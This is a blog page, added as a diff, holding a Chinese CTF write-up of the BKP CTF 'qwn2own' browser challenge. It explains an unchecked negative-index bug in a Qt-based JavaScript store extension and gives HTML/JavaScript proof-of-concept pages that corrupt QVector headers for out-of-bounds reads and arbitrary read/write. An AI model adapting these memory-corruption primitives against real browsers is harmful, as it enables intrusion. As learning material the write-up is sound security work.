@@ -1,0 +1,935 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="en">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+</style>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=6.7.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.7.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=6.7.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=6.7.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.7.0" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '6.7.0',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="最近一直在看 webkit，可是一点进展都没有，很多还是看不懂，感觉 webkit 有点复杂， 还是慢慢看吧，自信心都快没了，先入门 Javascriptcore 吧， 先看看相关的题目，后面应该还会有，只是给自己写的笔记，可能太乱。">
+<meta name="keywords" content="ctf,browser">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BKP CTF qwn2own">
+<meta property="og:url" content="https://vsane.github.io/2019/01/25/qwn2own/index.html">
+<meta property="og:site_name" content="V4kst1z&#39;s Blog">
+<meta property="og:description" content="最近一直在看 webkit，可是一点进展都没有，很多还是看不懂，感觉 webkit 有点复杂， 还是慢慢看吧，自信心都快没了，先入门 Javascriptcore 吧， 先看看相关的题目，后面应该还会有，只是给自己写的笔记，可能太乱。">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2019-01-25T12:51:11.707Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="BKP CTF qwn2own">
+<meta name="twitter:description" content="最近一直在看 webkit，可是一点进展都没有，很多还是看不懂，感觉 webkit 有点复杂， 还是慢慢看吧，自信心都快没了，先入门 Javascriptcore 吧， 先看看相关的题目，后面应该还会有，只是给自己写的笔记，可能太乱。">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="V4kst1z's Blog" type="application/atom+xml">
+
+
+
+
+  <link rel="canonical" href="https://vsane.github.io/2019/01/25/qwn2own/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>BKP CTF qwn2own | V4kst1z's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">V4kst1z's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tag"></i> <br>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://vsane.github.io/2019/01/25/qwn2own/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="V4kst1z">
+      <meta itemprop="description" content="Bin Dog">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="V4kst1z's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">BKP CTF qwn2own
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-01-25 20:50:03 / Modified: 20:51:11" itemprop="dateCreated datePublished" datetime="2019-01-25T20:50:03+08:00">2019-01-25</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/01/25/qwn2own/#comments" itemprop="discussionUrl">
+                  <span class="post-meta-item-text">Comments: </span> <span class="post-comments-count valine-comment-count" data-xid="/2019/01/25/qwn2own/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon">
+            <i class="fa fa-eye"></i>
+             Views:  
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <hr>
+<p>最近一直在看 <code>webkit</code>，可是一点进展都没有，很多还是看不懂，感觉 <code>webkit</code> 有点复杂， 还是慢慢看吧，自信心都快没了，先入门 <code>Javascriptcore</code> 吧， 先看看相关的题目，后面应该还会有，只是给自己写的笔记，可能太乱。<br><a id="more"></a></p>
+<h2 id="题目介绍"><a href="#题目介绍" class="headerlink" title="题目介绍"></a>题目介绍</h2><blockquote>
+<p>The BKP Database JavasScript API allows users to store data that can be kept hidden from other users.<br>This allows web applications to share one web context between multiple users but yet still be able to store<br>sensitive information pertaining to each user and keep it secret from the others.</p>
+</blockquote>
+<p><code>emmm</code> 就是写了个 <code>JS</code> 的扩展。</p>
+<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p><code>BKPStore</code> 中的成员函数 <code>get</code>，<code>remove</code>，<code>cut</code> 的参数都是 <code>int</code> 型，并且在扩展实现中并未对传入的参数进行检验，当传入负数的时候会造成越界操作数据，可是后面发现 <code>get</code> 好像没用，看源码发现是 <code>QVector</code> 的 <code>value</code> 函数将 <code>int</code> 强制转换成了无符号整数。如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">template&lt;typename T&gt;</span><br><span class="line">Q_OUTOFLINE_TEMPLATE T QVector&lt;T&gt;::value(int i) const</span><br><span class="line">&#123;</span><br><span class="line">    if (uint(i) &gt;= uint(d-&gt;size)) &#123;</span><br><span class="line">        return T();</span><br><span class="line">    &#125;</span><br><span class="line">    return d-&gt;begin()[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>下面是 <code>BKPStore</code> 类的定义。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">class BKPStore : public QObject &#123;</span><br><span class="line">    Q_OBJECT</span><br><span class="line">public:</span><br><span class="line">    BKPStore(QObject * parent = 0, const QString &amp;name = 0, quint8 tp = 0, QVariant var = 0, qulonglong store_ping = 0);</span><br><span class="line">	void StoreData(QVariant v);</span><br><span class="line"></span><br><span class="line">	Q_INVOKABLE QVariant getall();</span><br><span class="line">	Q_INVOKABLE QVariant get(int idx);</span><br><span class="line">	Q_INVOKABLE int insert(unsigned int idx, QVariant var);</span><br><span class="line">	Q_INVOKABLE int append(QVariant var);</span><br><span class="line">	Q_INVOKABLE void remove(int idx);</span><br><span class="line">	Q_INVOKABLE void cut(int beg, int end);</span><br><span class="line">	Q_INVOKABLE int size();</span><br><span class="line"></span><br><span class="line">private:</span><br><span class="line">    quint8 type; // specifies which type to of vector</span><br><span class="line">                  // to use</span><br><span class="line">    QVector&lt;QVariant&gt; varvect;</span><br><span class="line">    QVector&lt;qulonglong&gt; intvect;</span><br><span class="line">    QVector&lt;QString&gt; strvect;</span><br><span class="line">    qulonglong store_ping;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
+<p><code>remove</code> 函数，可以看到并没有对传入的参数检测，<code>cut</code> 函数也是这样，并且都是调用 <code>erase</code> 去删除元素。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">void BKPStore::remove(int idx)&#123;</span><br><span class="line">    if(this-&gt;type == 0)&#123;</span><br><span class="line">        this-&gt;varvect.erase(this-&gt;varvect.begin() + idx);</span><br><span class="line">    &#125;else if(this-&gt;type == 1)&#123;</span><br><span class="line">        this-&gt;intvect.erase(this-&gt;intvect.begin() + idx);</span><br><span class="line">    &#125;else if(this-&gt;type == 2)&#123;</span><br><span class="line">        this-&gt;strvect.erase(this-&gt;strvect.begin() + idx);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        // this doesn&apos;t happen ever</span><br><span class="line">        BKPException ex;</span><br><span class="line">        throw ex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>下面看下 <code>erase</code> 函数的实现，其实实现很简单，如果是静态 <code>Vector</code> 就在逐个删除数组中数据的同时将后面不需要删除的通过 <code>new</code> 重新拷贝过来，如果是非静态就直接通过析构函数删除需要被删除的，后面的直接通过 <code>memmove</code> 函数拷贝过来。可以看到并没有对传入的参数的合法性进行检查。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">template &lt;typename T&gt;</span><br><span class="line">typename QVector&lt;T&gt;::iterator QVector&lt;T&gt;::erase(iterator abegin, iterator aend)</span><br><span class="line">&#123;</span><br><span class="line">    const int itemsToErase = aend - abegin;</span><br><span class="line"></span><br><span class="line">    if (!itemsToErase)</span><br><span class="line">        return abegin;</span><br><span class="line"></span><br><span class="line">    const int itemsUntouched = abegin - d-&gt;begin();</span><br><span class="line"></span><br><span class="line">    if (d-&gt;alloc) &#123;</span><br><span class="line">        detach();</span><br><span class="line">        abegin = d-&gt;begin() + itemsUntouched;</span><br><span class="line">        aend = abegin + itemsToErase;</span><br><span class="line">        if (QTypeInfo&lt;T&gt;::isStatic) &#123;</span><br><span class="line">            iterator moveBegin = abegin + itemsToErase;</span><br><span class="line">            iterator moveEnd = d-&gt;end();</span><br><span class="line">            while (moveBegin != moveEnd) &#123;</span><br><span class="line">                if (QTypeInfo&lt;T&gt;::isComplex)</span><br><span class="line">                    static_cast&lt;T *&gt;(abegin)-&gt;~T();</span><br><span class="line">                new (abegin++) T(*moveBegin++);</span><br><span class="line">            &#125;</span><br><span class="line">            if (abegin &lt; d-&gt;end()) &#123;</span><br><span class="line">                // destroy rest of instances</span><br><span class="line">                destruct(abegin, d-&gt;end());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            destruct(abegin, aend);</span><br><span class="line">            memmove(abegin, aend, (d-&gt;size - itemsToErase - itemsUntouched) * sizeof(T));</span><br><span class="line">        &#125;</span><br><span class="line">        d-&gt;size -= itemsToErase;</span><br><span class="line">    &#125;</span><br><span class="line">    return d-&gt;begin() + itemsUntouched;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><h3 id="Partial-OOB-read"><a href="#Partial-OOB-read" class="headerlink" title="Partial OOB read"></a>Partial OOB read</h3><p>当 <code>remove</code> 中传入的参数为负数时，会将负数位置处的数据删除，在将之后的数据拷贝过来，所以会将数据前的内存破坏。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inline iterator erase(iterator pos) &#123; return erase(pos, pos+1); &#125;</span><br></pre></td></tr></table></figure></p>
+<p>下面是 <code>QArrayData</code> 的定义<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">struct Q_CORE_EXPORT QArrayData</span><br><span class="line">&#123;</span><br><span class="line">    QtPrivate::RefCount ref;    //引用计数</span><br><span class="line">    int size;                   //数组大小</span><br><span class="line">    uint alloc : 31;            //占了31位</span><br><span class="line">    uint capacityReserved : 1;  //占了1位</span><br><span class="line"></span><br><span class="line">    qptrdiff offset; // in bytes from beginning of header 从 Array 开始到数据的偏移</span><br><span class="line"></span><br><span class="line">    void *data()</span><br><span class="line">    &#123;</span><br><span class="line">        Q_ASSERT(size == 0</span><br><span class="line">                || offset &lt; 0 || size_t(offset) &gt;= sizeof(QArrayData));</span><br><span class="line">        return reinterpret_cast&lt;char *&gt;(this) + offset;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    const void *data() const</span><br><span class="line">    &#123;</span><br><span class="line">        Q_ASSERT(size == 0</span><br><span class="line">                || offset &lt; 0 || size_t(offset) &gt;= sizeof(QArrayData));</span><br><span class="line">        return reinterpret_cast&lt;const char *&gt;(this) + offset;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到通过 <code>remove(-1)</code> 就可以改写 <code>offset</code> 来越界读取 <code>Array</code> 结构信息。如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;qwn2own&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">   &lt;div id=&quot;v4kst1z&quot;&gt;&lt;/div&gt;</span><br><span class="line">   &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">      var db = BKPDataBase.create(&quot;v4kst1z&quot;, &quot;v4kst1z&quot;);</span><br><span class="line">      store = db.createStore(&quot;A&quot;, 1, [0, 1, 2, 3, 4, 5, 6], 0xaabb);</span><br><span class="line">      store.remove(-1);</span><br><span class="line"></span><br><span class="line">      var info = &quot;&quot;;</span><br><span class="line">      for (var i=0;i&lt;6;i++) &#123;</span><br><span class="line">         info  = info + i + &quot; : &quot; + store.get(i).toString(16) + &quot;&lt;br&gt;&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">      document.getElementById(&quot;v4kst1z&quot;).innerHTML = info;</span><br><span class="line">   &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>![Snipaste_2019-01-25_20-10-44.png-44.9kB][1]<br>  [1]: <a href="http://static.zybuluo.com/dane909/5p16mzx3nhurqxehguq53zch/Snipaste_2019-01-25_20-10-44.png" target="_blank" rel="noopener">http://static.zybuluo.com/dane909/5p16mzx3nhurqxehguq53zch/Snipaste_2019-01-25_20-10-44.png</a></p>
+<h3 id="Arbitrary-R-W"><a href="#Arbitrary-R-W" class="headerlink" title="Arbitrary R/W"></a>Arbitrary R/W</h3><p>在 <code>QArrayData</code> 中的 <code>size</code> 变量指定了数组的大小，如果修改 <code>size</code> 的大小，便可以达到任意读写。下面先来确定<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;qwn2own&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">   &lt;div id=&quot;v4kst1z&quot;&gt;&lt;/div&gt;</span><br><span class="line">   &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">      var db = BKPDataBase.create(&quot;v4kst1z&quot;, &quot;v4kst1z&quot;);</span><br><span class="line">      store1 = db.createStore(&quot;A&quot;, 1, [0, 1, 2, 3, 4, 5, 6], 0xaabb);</span><br><span class="line">      store2 = db.createStore(&quot;B&quot;, 1, [0, 1, 2, 3, 4, 5, 6], 0xccddee);</span><br><span class="line">      store1.remove(-1);</span><br><span class="line">      store1.insert(0, 0xffffffff00000001);</span><br><span class="line"></span><br><span class="line">      var idx = -1;</span><br><span class="line">      for(i = 0; i &lt; 0x100; i++) &#123;</span><br><span class="line">         x = store1.get(i);</span><br><span class="line">         if (x == 0xccddee &amp;&amp; (store1.get(i-1) == store1.get(i-3))) &#123;</span><br><span class="line">            //strvect 和 varvect 在内存中的值相同</span><br><span class="line">            idx = i;</span><br><span class="line">            break;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      if (idx == -1) &#123;</span><br><span class="line">         alert(&quot;Not found, reloading...&quot;);</span><br><span class="line">         document.location = window.location.href;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">         document.getElementById(&quot;v4kst1z&quot;).innerHTML = &quot;Found at idx &quot; + i;</span><br><span class="line">      &#125;</span><br><span class="line">   &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
+          
+            <a href="/tags/browser/" rel="tag"><i class="fa fa-tag"></i> browser</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/01/09/QEMU-shadowstack/" rel="next" title="QEMU部分源码阅读">
+                <i class="fa fa-chevron-left"></i> QEMU部分源码阅读
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="V4kst1z">
+            
+              <p class="site-author-name" itemprop="name">V4kst1z</p>
+              <p class="site-description motion-element" itemprop="description">Bin Dog</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">6</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">6</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/Vsane" title="GitHub &rarr; https://github.com/Vsane" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://twitter.com/v4kst1z" title="Twitter &rarr; https://twitter.com/v4kst1z" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://aryb1n.github.io/" title="https://aryb1n.github.io/" rel="noopener" target="_blank">Aryb1n</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://52yuluo.top/" title="http://52yuluo.top/" rel="noopener" target="_blank">Yuluo</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目介绍"><span class="nav-number">1.</span> <span class="nav-text">题目介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞成因"><span class="nav-number">2.</span> <span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exploit"><span class="nav-number">3.</span> <span class="nav-text">exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Partial-OOB-read"><span class="nav-number">3.1.</span> <span class="nav-text">Partial OOB read</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Arbitrary-R-W"><span class="nav-number">3.2.</span> <span class="nav-text">Arbitrary R/W</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">V4kst1z</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v6.7.0</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="post-meta-item-icon">
